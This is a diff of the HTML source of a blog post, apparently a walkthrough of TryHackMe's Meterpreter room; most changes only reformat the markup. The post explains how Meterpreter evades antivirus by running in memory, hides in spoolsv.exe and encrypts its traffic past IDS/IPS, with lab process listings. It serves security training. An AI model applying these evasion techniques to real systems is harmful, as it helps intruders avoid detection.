@@ -3,12 +3,10 @@
 <meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta http-equiv=x-ua-compatible content="ie=edge">
-<title>TryHackMe Metasploit Meterpreter | Classroom</title>
-<link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon>
+<title>TryHackMe Metasploit Meterpreter | Classroom</title><link href=/img/avatar.jpeg rel="shortcut icon" type=image/x-icon>
 <meta name=author content="Animesh Roy">
 <meta name=description content="Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation. TryHackMe Room Metasploit Meterpreter solved by Animesh Roy. this is a walkthough. read more...">
-<title>Animesh Roy | Classroom Posts</title>
-<meta name=title content="Animesh Roy | Blogs & Writeups">
+<title>Animesh Roy | Classroom Posts</title><meta name=title content="Animesh Roy | Blogs & Writeups">
 <meta name=description content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://classroom.anir0y.in/">
@@ -23,8 +21,8 @@
 <script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
 <script data-ad-client=ca-pub-3526678290068011 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script>
-<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-NZBEX7RBNF')</script>
-<script type=text/javascript>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","6gp5990ghr")</script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-NZBEX7RBNF")</script>
+<script type=text/javascript>(function(e,o,t,i,a,n,s){e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},n=o.createElement(i),n.async=1,n.src="https://www.clarity.ms/tag/"+a,s=o.getElementsByTagName(i)[0],s.parentNode.insertBefore(n,s)})(window,document,"clarity","script","6gp5990ghr")</script>
 <link rel=canonical href=https://classroom.anir0y.in/post/tryhackme-meterpreter/>
 <meta property="og:title" content="TryHackMe Metasploit Meterpreter">
 <meta property="og:description" content="Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation. TryHackMe Room Metasploit Meterpreter solved by Animesh Roy. this is a walkthough. read more...">
@@ -41,26 +39,19 @@
 <link rel=stylesheet href=/css/github-markdown.css>
 <link rel=stylesheet href=/css/site.css>
 <link rel=stylesheet href=/css/custom.css>
-<style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style>
-<link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css>
+<style>a:not(.ui.button):hover{text-decoration:underline}a:not(.ui.button){color:#2e8b57!important}.inverted a:not(.ui.button),.inverted a:not(.ui.button):hover{color:#8fbc8f!important}body.default{background-color:#fff}body.dark{background-color:#000}</style><link rel=stylesheet data-highlight href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/tomorrow.min.css>
 <link rel=stylesheet href=/css/custom.css>
-</head>
-<body class=default>
+</head><body class=default>
 <nav class="ui secondary menu dream-menu">
 <div class=item>
 <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
-</div>
-<div class=item>
-<i class="large link home icon" title=Home onclick="window.location.href='https://classroom.anir0y.in'"></i>
-</div>
-<div class=item>
+</div><div class=item>
+<i class="large link home icon" title=Home onclick='window.location.href="https://classroom.anir0y.in"'></i>
+</div><div class=item>
 <i class="large link icon theme-switch" onclick=themeSwitch()></i>
-</div>
-<div class=item>
+</div><div class=item>
 <i class="large link search icon" onclick=toggleSearch()></i>
-</div>
-</nav>
-<div class=flip-container>
+</div></nav><div class=flip-container>
 <div class=flipper>
 <section class=front>
 <div class=dream-max-width>
@@ -69,30 +60,11 @@
 <div class="ui segment toc">
 <nav id=TableOfContents>
 <ul>
-<li><a href=#overview>OverView</a></li>
-<li><a href=#task-01-introduction-to-meterpreter>Task 01: Introduction to Meterpreter</a></li>
-<li><a href=#task-02-meterpreter-flavors>Task 02: Meterpreter Flavors</a></li>
-<li><a href=#task-03--meterpreter-commands>Task 03: Meterpreter Commands</a></li>
-<li><a href=#task-04post-exploitation-with-meterpreter>Task 04:Post-Exploitation with Meterpreter</a></li>
-<li><a href=#task-05-post-exploitation-challenge>Task 05: Post-Exploitation Challenge</a>
+<li><a href=#overview>OverView</a></li><li><a href=#task-01-introduction-to-meterpreter>Task 01: Introduction to Meterpreter</a></li><li><a href=#task-02-meterpreter-flavors>Task 02: Meterpreter Flavors</a></li><li><a href=#task-03--meterpreter-commands>Task 03: Meterpreter Commands</a></li><li><a href=#task-04post-exploitation-with-meterpreter>Task 04:Post-Exploitation with Meterpreter</a></li><li><a href=#task-05-post-exploitation-challenge>Task 05: Post-Exploitation Challenge</a>
 <ul>
-<li><a href=#answer-the-questions-below>Answer the questions below</a></li>
-</ul>
-</li>
-<li><a href=#solutions>solutions</a>
+<li><a href=#answer-the-questions-below>Answer the questions below</a></li></ul></li><li><a href=#solutions>solutions</a>
 <ul>
-<li><a href=#1-sysinfo>1 sysinfo</a></li>
-<li><a href=#3>3</a></li>
-<li><a href=#4>4</a></li>
-<li><a href=#5>5</a></li>
-<li><a href=#6>6</a></li>
-<li><a href=#8>8</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-<div class="ui segment actions">
+<li><a href=#1-sysinfo>1 sysinfo</a></li><li><a href=#3>3</a></li><li><a href=#4>4</a></li><li><a href=#5>5</a></li><li><a href=#6>6</a></li><li><a href=#8>8</a></li></ul></li></ul></nav></div><div class="ui segment actions">
 <button class="ui circular icon button save-as-image" title="Save as image" onclick=savePostAsImg()>
 <i class="save icon"></i>
 </button>
@@ -102,9 +74,7 @@
 <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-meterpreter%2f" class="ui circular facebook icon button">
 <i class="facebook icon"></i>
 </a>
-</div>
-</aside>
-<div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img>
+</div></aside><div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id=dream-save-post-as-img>
 <section class="ui top attached segment">
 <header>
 <h1 class="ui large header">TryHackMe Metasploit Meterpreter<div class="sub header">
@@ -115,428 +85,204 @@ Thursday, Sep 30, 2021
 | 12 minutes read
 | Update at
 Thursday, Sep 30, 2021
-</div>
-</h1>
-</header>
-<article class=main><h2 id=overview>OverView</h2>
-<p>Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.</p>
-<table>
+</div></h1></header><article class=main><h2 id=overview>OverView</h2><p>Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.</p><table>
 <thead>
 <tr>
-<th></th>
-<th></th>
-</tr>
-</thead>
-<tbody>
+<th></th><th></th></tr></thead><tbody>
 <tr>
-<td><script src=https://tryhackme.com/badge/434937></script></td>
-<td><a class=twitter-follow-button href=https://twitter.com/anir0y data-size=large> Follow @anir0y<a></td>
-</tr>
-<tr>
-<td>Metasploit: Meterpreter</td>
-<td><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/7774a96fb05b63b3abfed628f267f2a9.png alt=logo></td>
-</tr>
-<tr>
-<td><b> Metasploit: Meterpreter [Subscription Required] </b></td>
-<td><a href>Metasploit: Meterpreter</a></td>
-</tr>
-</tbody>
-</table>
-<h2 id=task-01-introduction-to-meterpreter>Task 01: Introduction to Meterpreter</h2>
-<p>Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter&rsquo;s specialized commands.</p>
-<p>Meterpreter has many versions which will provide different functionalities based on the target system.</p>
-<p><strong>How does Meterpreter work?</strong></p>
-<p>Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.</p>
-<p>Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.</p>
-<p>While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.</p>
-<p>The example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the <code>getpid</code> command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).</p>
-<p><img src=https://i.imgur.com/uiqGUBQ.png alt=img></p>
-<p>If we list processes running on the target system using the ps command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.</p>
-<ul>
+<td><script src=https://tryhackme.com/badge/434937></script></td><td><a class=twitter-follow-button href=https://twitter.com/anir0y data-size=large> Follow @anir0y<a></td></tr><tr>
+<td>Metasploit: Meterpreter</td><td><img src=https://tryhackme-images.s3.amazonaws.com/room-icons/7774a96fb05b63b3abfed628f267f2a9.png alt=logo></td></tr><tr>
+<td><b> Metasploit: Meterpreter [Subscription Required] </b></td><td><a href>Metasploit: Meterpreter</a></td></tr></tbody></table><h2 id=task-01-introduction-to-meterpreter>Task 01: Introduction to Meterpreter</h2><p>Meterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter&rsquo;s specialized commands.</p><p>Meterpreter has many versions which will provide different functionalities based on the target system.</p><p><strong>How does Meterpreter work?</strong></p><p>Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.</p><p>Meterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.</p><p>While Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.</p><p>The example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the <code>getpid</code> command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).</p><p><img src=https://i.imgur.com/uiqGUBQ.png alt=img></p><p>If we list processes running on the target system using the ps command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.</p><ul>
 <li>
-<p>code</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>meterpreter &gt; ps
-
-Process List
-<span style=color:#f92672>============</span>
-
-PID   PPID  Name                  Arch  Session  User                          Path
----   ----  ----                  ----  -------  ----                          ----
-<span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>     <span style=color:#f92672>[</span>System Process<span style=color:#f92672>]</span>                                                   
-<span style=color:#ae81ff>4</span>     <span style=color:#ae81ff>0</span>     System                x64   <span style=color:#ae81ff>0</span>                                      
-<span style=color:#ae81ff>396</span>   <span style=color:#ae81ff>644</span>   LogonUI.exe           x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\L</span>ogonUI.exe
-<span style=color:#ae81ff>416</span>   <span style=color:#ae81ff>4</span>     smss.exe              x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           <span style=color:#ae81ff>\S</span>ystemRoot<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>mss.exe
-<span style=color:#ae81ff>428</span>   <span style=color:#ae81ff>692</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           
-<span style=color:#ae81ff>548</span>   <span style=color:#ae81ff>540</span>   csrss.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>srss.exe
-<span style=color:#ae81ff>596</span>   <span style=color:#ae81ff>540</span>   wininit.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\w</span>ininit.exe
-<span style=color:#ae81ff>604</span>   <span style=color:#ae81ff>588</span>   csrss.exe             x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>srss.exe
-<span style=color:#ae81ff>644</span>   <span style=color:#ae81ff>588</span>   winlogon.exe          x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\w</span>inlogon.exe
-<span style=color:#ae81ff>692</span>   <span style=color:#ae81ff>596</span>   services.exe          x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\s</span>ervices.exe
-<span style=color:#ae81ff>700</span>   <span style=color:#ae81ff>692</span>   sppsvc.exe            x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\N</span>ETWORK SERVICE  
-<span style=color:#ae81ff>716</span>   <span style=color:#ae81ff>596</span>   lsass.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\l</span>sass.exe  <span style=color:#ae81ff>1276</span>  <span style=color:#ae81ff>1304</span>  cmd.exe               x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>md.exe
-<span style=color:#ae81ff>1304</span>  <span style=color:#ae81ff>692</span>   spoolsv.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>poolsv.exe
-<span style=color:#ae81ff>1340</span>  <span style=color:#ae81ff>692</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\L</span>OCAL SERVICE    
-<span style=color:#ae81ff>1388</span>  <span style=color:#ae81ff>548</span>   conhost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>onhost.exe
-</code></pre></div></li>
-</ul>
-<p>Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)</p>
-<ul>
+<p>code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; ps
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Process List
+</span></span><span style=display:flex><span><span style=color:#f92672>============</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PID   PPID  Name                  Arch  Session  User                          Path
+</span></span><span style=display:flex><span>---   ----  ----                  ----  -------  ----                          ----
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>     <span style=color:#f92672>[</span>System Process<span style=color:#f92672>]</span>                                                   
+</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span>     <span style=color:#ae81ff>0</span>     System                x64   <span style=color:#ae81ff>0</span>                                      
+</span></span><span style=display:flex><span><span style=color:#ae81ff>396</span>   <span style=color:#ae81ff>644</span>   LogonUI.exe           x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\L</span>ogonUI.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>416</span>   <span style=color:#ae81ff>4</span>     smss.exe              x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           <span style=color:#ae81ff>\S</span>ystemRoot<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>mss.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>428</span>   <span style=color:#ae81ff>692</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           
+</span></span><span style=display:flex><span><span style=color:#ae81ff>548</span>   <span style=color:#ae81ff>540</span>   csrss.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>srss.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>596</span>   <span style=color:#ae81ff>540</span>   wininit.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\w</span>ininit.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>604</span>   <span style=color:#ae81ff>588</span>   csrss.exe             x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>srss.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>644</span>   <span style=color:#ae81ff>588</span>   winlogon.exe          x64   <span style=color:#ae81ff>1</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\w</span>inlogon.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>692</span>   <span style=color:#ae81ff>596</span>   services.exe          x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\s</span>ervices.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>700</span>   <span style=color:#ae81ff>692</span>   sppsvc.exe            x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\N</span>ETWORK SERVICE  
+</span></span><span style=display:flex><span><span style=color:#ae81ff>716</span>   <span style=color:#ae81ff>596</span>   lsass.exe             x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\l</span>sass.exe  <span style=color:#ae81ff>1276</span>  <span style=color:#ae81ff>1304</span>  cmd.exe               x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>md.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1304</span>  <span style=color:#ae81ff>692</span>   spoolsv.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\s</span>poolsv.exe
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1340</span>  <span style=color:#ae81ff>692</span>   svchost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\L</span>OCAL SERVICE    
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1388</span>  <span style=color:#ae81ff>548</span>   conhost.exe           x64   <span style=color:#ae81ff>0</span>        NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM           C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\c</span>onhost.exe
+</span></span></code></pre></div></li></ul><p>Even if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)</p><ul>
 <li>
-<p>code</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;tasklist /m /fi <span style=color:#e6db74>&#34;pid eq 1304&#34;</span>
-tasklist /m /fi <span style=color:#e6db74>&#34;pid eq 1304&#34;</span>
-
-Image Name                     PID Modules                                     
-<span style=color:#f92672>=========================</span> <span style=color:#f92672>========</span> <span style=color:#f92672>============================================</span>
-spoolsv.exe                   <span style=color:#ae81ff>1304</span> ntdll.dll, kernel32.dll, KERNELBASE.dll,    
-                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        
-                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  
-                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   
-                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      
-                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         
-                                   NSI.dll, IMM32.DLL, MSCTF.dll,              
-                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    
-                                   secur32.dll, SSPICLI.DLL, credssp.dll,      
-                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      
-                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     
-                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         
-                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         
-                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      
-                                   srvcli.dll, winspool.drv,                   
-                                   PrintIsolationProxy.dll, FXSMON.DLL,        
-                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       
-                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        
-                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       
-                                   webservices.dll, FirewallAPI.dll,           
-                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        
-                                   winprint.dll, USERENV.dll, profapi.dll,     
-                                   GPAPI.dll, dsrole.dll, win32spl.dll,        
-                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          
-                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        
-                                   cscapi.dll, netutils.dll, WININET.dll,      
-                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      
-                                   webio.dll, SHELL32.dll, MPR.dll,            
-                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        
-                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     
-                                   apphelp.dll, NLAapi.dll, napinsp.dll,       
-                                   pnrpnsp.dll, winrnr.dll                     
-
-C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;
-</code></pre></div></li>
-</ul>
-<p>Techniques and tools that can be used to detect Meterpreter are beyond the scope of this room. This section aimed to show you how stealthy Meterpreter is running; remember, most antivirus software will detect it.</p>
-<p>It is also worth noting that Meterpreter will establish an encrypted (TLS) communication channel with the attacker&rsquo;s system.</p>
-<hr>
+<p>code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;tasklist /m /fi <span style=color:#e6db74>&#34;pid eq 1304&#34;</span>
+</span></span><span style=display:flex><span>tasklist /m /fi <span style=color:#e6db74>&#34;pid eq 1304&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Image Name                     PID Modules                                     
+</span></span><span style=display:flex><span><span style=color:#f92672>=========================</span> <span style=color:#f92672>========</span> <span style=color:#f92672>============================================</span>
+</span></span><span style=display:flex><span>spoolsv.exe                   <span style=color:#ae81ff>1304</span> ntdll.dll, kernel32.dll, KERNELBASE.dll,    
+</span></span><span style=display:flex><span>                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        
+</span></span><span style=display:flex><span>                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  
+</span></span><span style=display:flex><span>                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   
+</span></span><span style=display:flex><span>                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      
+</span></span><span style=display:flex><span>                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         
+</span></span><span style=display:flex><span>                                   NSI.dll, IMM32.DLL, MSCTF.dll,              
+</span></span><span style=display:flex><span>                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    
+</span></span><span style=display:flex><span>                                   secur32.dll, SSPICLI.DLL, credssp.dll,      
+</span></span><span style=display:flex><span>                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      
+</span></span><span style=display:flex><span>                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     
+</span></span><span style=display:flex><span>                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         
+</span></span><span style=display:flex><span>                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         
+</span></span><span style=display:flex><span>                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      
+</span></span><span style=display:flex><span>                                   srvcli.dll, winspool.drv,                   
+</span></span><span style=display:flex><span>                                   PrintIsolationProxy.dll, FXSMON.DLL,        
+</span></span><span style=display:flex><span>                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       
+</span></span><span style=display:flex><span>                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        
+</span></span><span style=display:flex><span>                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       
+</span></span><span style=display:flex><span>                                   webservices.dll, FirewallAPI.dll,           
+</span></span><span style=display:flex><span>                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        
+</span></span><span style=display:flex><span>                                   winprint.dll, USERENV.dll, profapi.dll,     
+</span></span><span style=display:flex><span>                                   GPAPI.dll, dsrole.dll, win32spl.dll,        
+</span></span><span style=display:flex><span>                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          
+</span></span><span style=display:flex><span>                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        
+</span></span><span style=display:flex><span>                                   cscapi.dll, netutils.dll, WININET.dll,      
+</span></span><span style=display:flex><span>                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      
+</span></span><span style=display:flex><span>                                   webio.dll, SHELL32.dll, MPR.dll,            
+</span></span><span style=display:flex><span>                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        
+</span></span><span style=display:flex><span>                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     
+</span></span><span style=display:flex><span>                                   apphelp.dll, NLAapi.dll, napinsp.dll,       
+</span></span><span style=display:flex><span>                                   pnrpnsp.dll, winrnr.dll                     
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;
